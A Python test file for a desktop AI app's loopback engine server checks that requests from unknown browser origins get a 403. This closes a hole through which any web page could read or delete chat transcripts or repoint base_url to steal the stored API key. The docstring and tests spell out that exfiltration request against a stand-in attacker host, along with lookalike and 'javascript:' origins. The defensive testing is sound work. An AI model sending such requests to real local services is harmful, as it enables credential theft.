"""A page in the user's browser must not be able to drive the engine.

The engine binds loopback, which keeps other machines out but not other pages:
any site the user has open can reach 127.0.0.1 with a two-line fetch. With
`Access-Control-Allow-Origin: *` and no authentication, that page could

  POST /settings {"base_url": "http://attacker.example/v1"}

and the stored API key would travel to that host on the next turn. Redacting
settings replies stopped the key being *echoed*; it did nothing about the key
being *sent*. Reading and deleting every chat transcript was open too.

A browser attaches Origin to cross-origin requests and a page cannot forge it,
so refusing unknown origins closes this without a shared secret. Requests with
no Origin stay allowed -- cli.py, these tests and curl are local processes that
already have the user's filesystem.

Run: .venv/bin/python -m unittest discover -s engine -p 'test_*.py'
"""
import importlib.util
import json
import os
import pathlib
import tempfile
import threading
import unittest
import urllib.error
import urllib.request
from http.server import ThreadingHTTPServer

_HOME = tempfile.mkdtemp(prefix="praison-origin-")
os.environ["PRAISONAI_DESKTOP_HOME"] = _HOME
os.environ["PRAISONAI_KEYCHAIN_SERVICE"] = "ai.praison.desktop.test.origin." + str(os.getpid())

_spec = importlib.util.spec_from_file_location(
    "engine_server_origin", pathlib.Path(__file__).with_name("server.py"))
server = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(server)

assert server.KEYCHAIN_SERVICE != "ai.praison.desktop", (
    "refusing to run: this test would write into the real keychain service")

ATTACKER = "https://evil.example"
APP = "tauri://localhost"


class OriginPredicate(unittest.TestCase):

    def test_the_webview_origin_is_allowed_on_every_platform(self):
        for origin in ("tauri://localhost", "http://tauri.localhost",
                       "https://tauri.localhost"):
            self.assertTrue(server.origin_allowed(origin), origin)

    def test_localhost_dev_server_is_allowed(self):
        for origin in ("http://localhost:1420", "http://127.0.0.1:8765"):
            self.assertTrue(server.origin_allowed(origin), origin)

    def test_no_origin_is_allowed(self):
        """cli.py and curl are local processes; a token would protect nothing."""
        self.assertTrue(server.origin_allowed(""))

    def test_a_web_page_is_refused(self):
        self.assertFalse(server.origin_allowed(ATTACKER))

    def test_a_null_origin_is_refused(self):
        """A sandboxed iframe or file:// document sends Origin: null."""
        self.assertFalse(server.origin_allowed("null"))

    def test_a_suffix_lookalike_is_refused(self):
        """Matching on the parsed hostname, not a prefix or substring."""
        for origin in ("http://tauri.localhost.evil.com",
                       "http://localhost.evil.com",
                       "http://notlocalhost"):
            self.assertFalse(server.origin_allowed(origin), origin)

    def test_a_bogus_scheme_is_refused(self):
        self.assertFalse(server.origin_allowed("javascript:alert(1)"))


class OriginGateOverHttp(unittest.TestCase):
    """Drive the real Handler over a real socket."""

    def setUp(self):
        server.SETTINGS_PATH.parent.mkdir(parents=True, exist_ok=True)
        if server.SETTINGS_PATH.exists():
            server.SETTINGS_PATH.unlink()
        self.httpd = ThreadingHTTPServer(("127.0.0.1", 0), server.Handler)
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()
        self.base = "http://127.0.0.1:%d" % self.httpd.server_address[1]

    def tearDown(self):
        self.httpd.shutdown()
        self.httpd.server_close()
        for key in server.SECRET_KEYS:
            server.keychain_set(key, "")

    def call(self, method, path, body=None, origin=None):
        data = json.dumps(body).encode() if body is not None else None
        headers = {"Content-Type": "application/json"}
        if origin is not None:
            headers["Origin"] = origin
        req = urllib.request.Request(
            self.base + path, data=data, method=method, headers=headers)
        try:
            with urllib.request.urlopen(req, timeout=10) as resp:
                return resp.status, resp.headers.get("Access-Control-Allow-Origin")
        except urllib.error.HTTPError as exc:
            return exc.code, exc.headers.get("Access-Control-Allow-Origin")

    def test_an_attacker_page_cannot_repoint_base_url(self):
        """The exfiltration path: repoint base_url, key follows on next turn."""
        self.call("POST", "/settings", {"api_key": "sk-canary"})
        status, _ = self.call("POST", "/settings",
                              {"base_url": "http://attacker.example/v1"},
                              origin=ATTACKER)
        self.assertEqual(status, 403)
        self.assertNotEqual(
            server.load_settings().get("base_url"), "http://attacker.example/v1",
            "a web page repointed base_url at a host it controls")

    def test_an_attacker_page_cannot_read_transcripts(self):
        status, _ = self.call("GET", "/chats", origin=ATTACKER)
        self.assertEqual(status, 403)

    def test_an_attacker_page_cannot_delete_a_chat(self):
        status, _ = self.call("DELETE", "/chats/anything", origin=ATTACKER)
        self.assertEqual(status, 403)

    def test_a_refusal_carries_no_cors_header(self):
        """Without ACAO the page cannot read the reply either."""
        _, acao = self.call("GET", "/chats", origin=ATTACKER)
        self.assertIsNone(acao)

    def test_preflight_from_an_attacker_is_refused(self):
        status, _ = self.call("OPTIONS", "/settings", origin=ATTACKER)
        self.assertEqual(status, 403)

    def test_the_app_still_works(self):
        for method, path, body in (("GET", "/chats", None),
                                   ("POST", "/settings", {"theme": "dark"}),
                                   ("OPTIONS", "/settings", None)):
            status, acao = self.call(method, path, body, origin=APP)
            self.assertIn(status, (200, 204), f"{method} {path}")
            self.assertEqual(acao, APP, f"{method} {path} lost its CORS header")

    def test_the_reply_never_carries_a_wildcard(self):
        _, acao = self.call("GET", "/chats", origin=APP)
        self.assertNotEqual(acao, "*", "wildcard CORS is what let any page in")

    def test_a_local_process_with_no_origin_still_works(self):
        """cli.py must keep working."""
        status, _ = self.call("GET", "/chats")
        self.assertEqual(status, 200)


if __name__ == "__main__":
    unittest.main()
